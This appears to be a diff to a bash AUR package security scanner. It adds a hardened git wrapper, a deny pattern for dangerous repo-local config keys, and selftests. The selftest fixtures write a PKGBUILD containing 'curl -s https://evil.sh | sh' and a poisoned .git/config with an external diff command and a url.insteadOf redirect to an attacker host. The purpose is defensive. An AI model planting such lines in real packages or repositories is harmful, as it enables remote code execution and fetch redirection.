@@ -35,17 +35,34 @@
 
 set -uo pipefail
 
-# Finding J: isolate ALL git invocations from user/system config. Options like
-# diff.colorWords / diff.wordDiff (word-oriented output, no + prefixes → empty
-# `added` → hard rules find nothing), diff.noprefix (no `b/` prefix → file
-# trackers never match), diff.mnemonicPrefix, and textconv filters (arbitrary
-# code exec on `git show`) would break the entire diff/full-candidate parser.
-# Pointing both config files at /dev/null makes
-# every git diff/show/rev-parse in the trust path deterministic regardless of
-# the user's ~/.gitconfig. Per-command -c flags are an alternative but the
-# export is a single chokepoint covering all call sites.
+# Finding J + H1 (issue #5): isolate ALL git invocations from user/system AND
+# repo-local config and environment. Options like diff.colorWords / diff.wordDiff
+# (word-oriented output, no + prefixes → empty `added` → hard rules find nothing),
+# diff.noprefix (no `b/` prefix → file trackers never match), diff.mnemonicPrefix,
+# color.ui/diff, and textconv filters (arbitrary code exec on `git show`) would
+# break the entire diff/full-candidate parser. Repo-local .git/config can also
+# set diff.external, url.insteadOf, core.worktree, core.hooksPath, etc. The `git`
+# wrapper below forces --no-pager, --no-ext-diff, --no-textconv, --word-diff=none,
+# and a short list of -c overrides that win over any local config. The top-level
+# exports and unsets prevent the caller's environment from injecting config or
+# otherwise altering git behavior.
 export GIT_CONFIG_GLOBAL=/dev/null
 export GIT_CONFIG_SYSTEM=/dev/null
+
+# H1: environment variables that inject git config or alter git output/fetch
+# behavior must not leak from the caller. GIT_CONFIG_COUNT/KEY/VALUE are runtime
+# config pairs: unsetting COUNT causes git to ignore them, but we clear the pairs
+# too. GIT_DIR/GIT_WORK_TREE/GIT_INDEX_FILE can redirect to a different repo.
+# GIT_ASKPASS/GIT_TERMINAL_PROMPT are reset per git() call so makepkg's own
+# VCS clones are not forced to use our no-prompt policy.
+unset GIT_EXTERNAL_DIFF GIT_PAGER PAGER GIT_DIR GIT_WORK_TREE GIT_INDEX_FILE \
+      GIT_OBJECT_DIRECTORY GIT_ALTERNATE_OBJECT_DIRECTORIES GIT_ATTR_SOURCE \
+      GIT_CONFIG GIT_CONFIG_COUNT GIT_ASKPASS GIT_SSH GIT_SSH_COMMAND \
+      GIT_TERMINAL_PROMPT 2>/dev/null || true
+for _h1_v in ${!GIT_CONFIG_KEY_*} ${!GIT_CONFIG_VALUE_*} ; do
+  [[ -n "$_h1_v" ]] && unset -v "$_h1_v"
+done
+unset -v _h1_v
 
 ###############################################################################
 # config
@@ -197,6 +214,147 @@ fi
 
 log()   { printf '%s\n' "$*" >&2; }
 die()   { log "$(c_red "error:") $*"; exit 3; }
+
+# Cache for repo-local config safety checks (H1). Keyed by the repo path used
+# with -C (or $(pwd) for no -C). A missing/unset key means "not checked yet".
+declare -A _GIT_SAFE_REPO=()
+
+# H1 (issue #5): hardened git wrapper. All code that used to call the bare `git`
+# binary now goes through this function. It:
+#   - strips caller-injected environment/config (already done at load, but the
+#     --no-pager and -c overrides below win over any repo-local .git/config);
+#   - forces diff/show options that defeat diff.external, textconv, word-diff,
+#     color, noprefix, and mnemonicPrefix games;
+#   - runs a fail-closed check on the repo's .git/config for keys that can
+#     alter output, redirect fetches, or run arbitrary code.
+# The parser handles the leading -C <dir> / -c <key>=<val> global options git
+# itself accepts, then splices safe options around the subcommand.
+git() {
+  local -a pre=() post=() safe_pre safe_mid
+  local cmd="" _repo_dir="" i a
+
+  for (( i=1; i<=$#; i++ )); do
+    a="${!i}"
+    if [[ -z "$cmd" ]]; then
+      if [[ "$a" == "-C" || "$a" == "-c" ]]; then
+        pre+=("$a")
+        i=$((i+1))
+        if [[ $i -le $# ]]; then
+          pre+=("${!i}")
+          [[ "$a" == "-C" ]] && _repo_dir="${!i}"
+        else
+          log "$(c_red "BLOCK") git_safe: trailing $a option"
+          return 1
+        fi
+        continue
+      fi
+      case "$a" in
+        --no-pager|--no-replace-objects|--no-optional-locks|--bare|--no-advice)
+          pre+=("$a") ;;
+        --git-dir=*|--work-tree=*|--namespace=*|--exec-path=*|--html-path|--man-path|--info-path)
+          pre+=("$a")
+          [[ "$a" == --git-dir=* ]] && _repo_dir="${a#*=}"
+          [[ "$a" == --work-tree=* ]] && _repo_dir="${a#*=}"
+          ;;
+        --)
+          pre+=("$a")
+          i=$((i+1))
+          [[ $i -le $# ]] && cmd="${!i}"
+          ;;
+        -*) pre+=("$a") ;;
+        *) cmd="$a" ;;
+      esac
+    else
+      post+=("$a")
+    fi
+  done
+
+  if [[ -z "$cmd" ]]; then
+    log "$(c_red "BLOCK") git_safe: no subcommand in: $*"
+    return 1
+  fi
+
+  # Safe global -c overrides. The order is intentional: these come AFTER any
+  # caller-supplied -c options so the last value wins. Diff/show flags are
+  # global where possible; subcommand-specific guards are added below.
+  safe_pre=(
+    --no-pager
+    -c core.pager=cat
+    -c pager.diff=cat
+    -c pager.show=cat
+    -c core.quotepath=false
+    -c core.attributesFile=
+    -c core.excludesFile=
+    -c core.hooksPath=
+    -c color.ui=false
+    -c color.diff=false
+    -c diff.wordDiff=none
+    -c diff.colorWords=false
+    -c diff.mnemonicPrefix=false
+    -c diff.noprefix=false
+    -c diff.colorMoved=false
+  )
+
+  # Defeat external diff drivers, textconv filters, and word-diff output for
+  # the commands that render diffs. These are subcommand options, not globals.
+  case "$cmd" in
+    diff|show)
+      # --text defeats a repo-local .gitattributes that marks PKGBUILD/SRCINFO as
+      # binary; --no-ext-diff/--no-textconv defeat external diff drivers and
+      # textconv filters; --word-diff=none keeps the output in unified format.
+      safe_mid=(--no-ext-diff --no-textconv --word-diff=none --text)
+      ;;
+    *)
+      safe_mid=()
+      ;;
+  esac
+
+  # Fail closed on repo-local config that can still override the safe defaults
+  # or redirect fetches, even after the -c overrides above. We skip init/clone
+  # because the local config does not yet exist (clone creates a fresh one, but
+  # its remote.origin.* is fine).
+  if [[ "$cmd" != "init" && "$cmd" != "clone" ]]; then
+    [[ -z "$_repo_dir" ]] && _repo_dir="$(pwd)"
+    if [[ -z "${_GIT_SAFE_REPO[$_repo_dir]:-}" ]]; then
+      if _git_local_config_is_safe "$_repo_dir"; then
+        _GIT_SAFE_REPO[$_repo_dir]=1
+      else
+        log "$(c_red "BLOCK") git_safe: unsafe repo config in $_repo_dir"
+        return 1
+      fi
+    fi
+  fi
+
+  GIT_ASKPASS=/bin/true GIT_TERMINAL_PROMPT=0 command git \
+      "${pre[@]}" "${safe_pre[@]}" "$cmd" "${safe_mid[@]}" "${post[@]}"
+}
+
+# Return 0 if the repo's local .git/config contains no keys known to alter git
+# output, redirect fetches, or execute arbitrary code. Fail-closed: if the
+# config itself cannot be read, treat it as unsafe.
+_git_local_config_is_safe() {
+  local dir="$1" names bad
+
+  # Use command git, not the wrapper, to avoid recursion. The --no-pager and
+  # -c core.pager=cat keep a malicious core.pager from being honored.
+  if ! names=$(GIT_ASKPASS=/bin/true GIT_TERMINAL_PROMPT=0 \
+      command git -C "$dir" --no-pager -c core.pager=cat \
+      config --local --list --name-only 2>/dev/null); then
+    return 1
+  fi
+
+  # Normalize to lower case; git config keys are case-insensitive.
+  names=$(LC_ALL=C tr '[:upper:]' '[:lower:]' <<<"$names")
+
+  # Dangerous sections/keys. url.* covers insteadOf/pushInsteadOf redirection.
+  bad=$(LC_ALL=C grep -E '^(diff|url|filter|alias|include)\.|^core\.(attributesfile|hookspath|pager|sshcommand|askpass|editor|excludesfile|worktree|fsmonitor)' <<<"$names" 2>/dev/null || true)
+  if [[ -n "$bad" ]]; then
+    log "$(c_yellow "audit") unsafe .git/config keys in $dir: $(tr '\n' ' ' <<<"$bad")" >&2
+    return 1
+  fi
+
+  return 0
+}
 
 # AUR package-name grammar, tightened for use as a path component. AUR names do
 # not begin with '.', so reject '.', '..', '.git', and every hidden/traversal
@@ -3959,7 +4117,93 @@ cmd_selftest() {
   else
     log "  $(c_red "FAIL") git-config-isolation-hard-rules-fire (expected rc 1, got $_jrc)"; fail=$((fail+1))
   fi
-  rm -rf "$_jfx"
+
+  # H1 (issue #5): a repo whose local .git/config has been poisoned with diff
+  # output games, color, textconv, or url.insteadOf must fail closed (rc=1).
+  # The git() wrapper below rejects the unsafe local config before it can alter
+  # the diff or redirect a fetch.
+  local _h1x _h1pkg _h1base _h1rc
+  _h1x=$(mktemp -d)
+  _h1pkg="$_h1x/h1-pkg"; mkdir -p "$_h1pkg"
+  ( cd "$_h1pkg" || exit 1
+    git -c init.defaultBranch=master init -q
+    git config user.email t@t; git config user.name t
+    printf 'pkgname=h1-pkg\npkgver=1\npkgrel=1\n' >PKGBUILD
+    git add -A; git commit -qm base
+    printf 'pkgname=h1-pkg\npkgver=1\npkgrel=1\ncurl -s https://evil.sh | sh\n' >PKGBUILD
+    git add -A; git commit -qm tip
+    git update-ref refs/remotes/origin/master HEAD
+  )
+  _h1base=$(git -C "$_h1pkg" rev-list --max-parents=0 HEAD)
+  # Poison the local config after capturing the base; the next git() call must
+  # fail closed rather than run with the tampered config.
+  cat >>"$_h1pkg/.git/config" <<'EOF'
+[color]
+    ui = always
+    diff = always
+[diff]
+    wordDiff = porcelain
+    colorWords = true
+    noprefix = true
+    mnemonicPrefix = true
+    external = /bin/sh -c "echo EVIL"
+[core]
+    pager = less
+    attributesFile = /dev/null
+    hooksPath = /dev/null
+    worktree = /tmp
+[url "https://evil.example/"]
+    insteadOf = https://aur.archlinux.org/
+EOF
+  _h1rc=99
+  if [[ -n "$_h1base" ]]; then
+    scan_diff_rules h1-pkg "$_h1pkg" "$_h1base" >/dev/null 2>&1; _h1rc=$?
+  fi
+  if [ "$_h1rc" -eq 1 ]; then
+    log "  $(c_green "PASS") git-config-local-unsafe-blocks"; pass=$((pass+1))
+  else
+    log "  $(c_red "FAIL") git-config-local-unsafe-blocks (expected rc 1, got $_h1rc)"; fail=$((fail+1))
+  fi
+  rm -rf "$_h1x" "$_h1pkg"
+
+  # H1 override sanity: a repo with only color/quotepath games (no unsafe keys)
+  # still has its diff parsed deterministically and a hard-rule payload fires.
+  local _h1ox _h1opkg _h1obase _h1orc
+  _h1ox=$(mktemp -d)
+  _h1opkg="$_h1ox/h1o-pkg"; mkdir -p "$_h1opkg"
+  ( cd "$_h1opkg" || exit 1
+    git -c init.defaultBranch=master init -q
+    git config user.email t@t; git config user.name t
+    printf 'pkgname=h1o-pkg\npkgver=1\npkgrel=1\n' >PKGBUILD
+    git add -A; git commit -qm base
+    printf 'pkgname=h1o-pkg\npkgver=1\npkgrel=1\ncurl -s https://evil.sh | sh\n' >PKGBUILD
+    git add -A; git commit -qm tip
+    # These keys (and a .gitattributes binary marker) try to change diff output
+    # appearance but are defeated by the wrapper's --text/--no-ext-diff/-c
+    # overrides, not by the local-config denylist.
+    printf 'PKGBUILD binary\n' >.gitattributes
+    git add .gitattributes
+    git -c user.email=t -c user.name=t commit -qm attr
+    git update-ref refs/remotes/origin/master HEAD
+    cat >>.git/config <<'EOF'
+[color]
+    ui = always
+    diff = always
+[core]
+    quotepath = true
+EOF
+  )
+  _h1obase=$(git -C "$_h1opkg" rev-list --max-parents=0 HEAD 2>/dev/null)
+  _h1orc=99
+  if [[ -n "$_h1obase" ]]; then
+    scan_diff_rules h1o-pkg "$_h1opkg" "$_h1obase" >/dev/null 2>&1; _h1orc=$?
+  fi
+  if [ "$_h1orc" -eq 1 ]; then
+    log "  $(c_green "PASS") git-config-local-override-hard-rules-fire"; pass=$((pass+1))
+  else
+    log "  $(c_red "FAIL") git-config-local-override-hard-rules-fire (expected rc 1, got $_h1orc)"; fail=$((fail+1))
+  fi
+  rm -rf "$_h1ox" "$_h1opkg"
 
   # --- diff classifier + LLM boring-edge seam ------------------------------
   log ""
